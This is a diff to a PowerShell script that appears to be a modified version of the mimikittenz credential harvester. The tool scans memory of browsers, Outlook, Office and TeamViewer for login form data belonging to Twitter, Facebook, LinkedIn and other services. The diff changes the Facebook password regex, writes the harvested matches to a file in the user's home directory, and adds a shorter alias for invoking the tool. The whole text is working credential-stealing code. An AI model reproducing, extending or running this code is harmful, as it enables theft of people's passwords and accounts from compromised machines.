@@ -504,7 +504,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     #Twitter
     [mimikittenz.MemProcInspector]::AddRegex("Twitter","username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me=")
     #Facebook
-    [mimikittenz.MemProcInspector]::AddRegex("Facebook","lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&(default_)?persistent=")
+    [mimikittenz.MemProcInspector]::AddRegex("Facebook","lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=")
     #LinkedIN
     [mimikittenz.MemProcInspector]::AddRegex("LinkedIN","session_key=.{1,50}&session_password=.{1,50}&isJsEnabled")
     
@@ -584,8 +584,13 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     #[mimikittenz.MemProcInspector]::AddRegex("Twitch.tv","<regex_here>")
     #Hitbox.TV
     #[mimikittenz.MemProcInspector]::AddRegex("Hitbox.tv","<regex_here>")
+
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
 $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox","outlook","MicrosoftEdge","EXCEL","WORD","teamviewer")
+[mimikittenz.MemProcInspector]::SaveToFile("$HOME/mkw.out",$matchesFound)
 
+"RAM scan complete, check $HOME/mkw.out"
 write-output $matchesFound
 }
+
+New-Alias -Name Invoke-MKW -Value Invoke-mimikittenz -Force
